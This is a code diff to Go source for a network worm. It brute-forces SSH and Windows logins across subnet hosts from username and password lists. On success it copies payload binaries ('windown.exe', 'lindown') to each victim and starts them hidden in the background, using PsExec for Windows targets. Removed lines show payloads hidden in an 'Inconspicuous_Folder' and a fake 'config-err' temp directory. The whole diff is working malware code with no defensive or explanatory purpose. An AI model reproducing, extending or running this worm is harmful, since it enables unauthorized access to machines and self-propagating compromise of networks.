@@ -52,19 +52,19 @@ func startwormingboi(myos string) {
 	}else {
 		subnets = os.Args[1]
 	}
-	var step = readinfile("step.txt")
+	var step = [3]string{"10","12","13"}
 	var myip = ""
 	var wg sync.WaitGroup
 		for _,element := range step{
 			myip = joinstrings(subnets,element)
 			fmt.Println(myip)
 				wg.Add(1)
-				go gettingin(myip, user, passwds, &wg)
+				go gettingin(myip, user, passwds, &wg, myos)
 			}
 			wg.Wait()
 	 } 
 
-func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup ){
+func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup, myos string ){
 	n := 0
 	var iswin = false
 	var passbreak = false
@@ -82,7 +82,6 @@ func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup 
 				iswin = true
 			}
 			if iswin{
-				/**
 				if  myos == "windows"{
 
 					wincon := getinwin(myip, user[j],passwds[k])
@@ -99,7 +98,7 @@ func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup 
 					fmt.Println("cant get onto windows from nonwindows :(")
 					passbreak = true
 					break
-				}*/
+				}
 				passbreak = true;
 			}
 			if n == 2{
@@ -135,18 +134,10 @@ func getinssh(myip string, user string, passwd string) (myreturn string) {
 	}
 
 	session := newsession(connection)
-	if (execlinuxcmd(session, "who")!=nil) {
-		execlinuxcmd(session, "mkdir \\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder'")
-		scpexec(session, "linuxhappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\linuxhappyfuntimes")
-		scpexec(session, "windowshappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
-		execlinuxcmd(session, "START /B \\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
-	} else {
-		execlinuxcmd(session, "mkdir /tmp/config-err-XJM1ll78")
-		scpexec(session, "linuxhappyfuntimes", "/tmp/config-err-XJM1ll78/linuxhappyfuntimes")
-		scpexec(session, "windowshappyfuntimes", "/tmp/config-err-XJM1ll78/windowshappyfuntimes")
-		execlinuxcmd(session, "./tmp/config-err-XJM1ll78/linuxhappyfuntimes > /dev/null 2>&1 &")
-		// add exploit here
-	}
+	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+	scpexec(session, "lindown", "/tmp/lindown")
+	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
 	session.Close()
 	return "yes"
 }
@@ -176,7 +167,23 @@ func scpexec( session *ssh.Session, srcfile string, destfile string)() {
 
 
 func getinwin(myip string, user string, passwd string) (wincon int) {
+	pscom := "PsExec.exe"
+	iparg := joinstrings("\\\\", myip)
+	cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","cmd","/c","START","/b",".\\windown.exe" )
+	output, _ := cmd.CombinedOutput()
+	strout := string(output)
+	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { 								//true work case
+		//put payload here
+		fmt.Println("exit 1")
 
+		wincon = 1
+	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true {						//false case
+		wincon = 2
+		fmt.Println("exit 2")
+	} else {											//psexec doesn't work
+		wincon = 3
+		fmt.Println("exit 3")
+	}
 	return
 }
 
